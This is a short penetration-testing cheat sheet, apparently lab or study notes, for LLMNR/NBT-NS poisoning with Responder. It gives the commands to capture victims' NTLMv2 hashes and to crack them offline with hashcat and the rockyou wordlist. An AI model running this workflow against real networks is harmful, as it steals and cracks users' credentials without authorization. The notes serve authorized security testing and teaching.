LLMNR Poisoning - Responder Cheat Sheet

A general LLMNR/NBT-NS poisoning workflow with Responder to capture NTLMv2 hashes.
Replace the placeholders (<...>) with your own values.


Step 1 - Launch Responder

    sudo responder -I <interface>

    Common flags:
      -I   interface to listen on (e.g. eth0)


Step 2 - Trigger the poisoning

Wait for a victim machine to broadcast an LLMNR or NBT-NS query.
This happens automatically when a user or process tries to reach a hostname
that does not exist in DNS (e.g. a mistyped share name like \\fileserv).
Responder intercepts the broadcast and replies with Kali's IP, causing the
victim to attempt NTLM authentication against Kali.


Step 3 - Capture the NTLMv2 hash

Responder prints captured hashes to the terminal and saves them to:

    /usr/share/responder/logs/

Look for a file named something like:
    SMB-NTLMv2-SSP-<victim-ip>.txt

Each captured hash looks like:
    <username>::<domain>:<challenge>:<response>:<NTLMv2 blob>


Step 4 - Crack the hash offline

Use hashcat with mode 5600 (NTLMv2):

    hashcat -m 5600 <hash-file> <wordlist> --force

Example with rockyou:
    hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-<victim-ip>.txt \
            /usr/share/wordlists/rockyou.txt --force


Step 5 - Stop Responder

Press Ctrl+C in the terminal running Responder.
Responder does not modify ARP tables, so no cleanup is needed on the network side.


(optional) Restore Kali's networking

Only needed if you manually set a static IP before the attack:

    sudo nmcli con mod "<connection name>" ipv4.method auto
    sudo nmcli con up "<connection name>"


Key idea: LLMNR and NBT-NS are fallback name-resolution protocols that broadcast
to the whole subnet when DNS fails. Responder answers those broadcasts and tricks
victims into handing over their NTLMv2 hashes - which can then be cracked offline
or used in relay attacks.
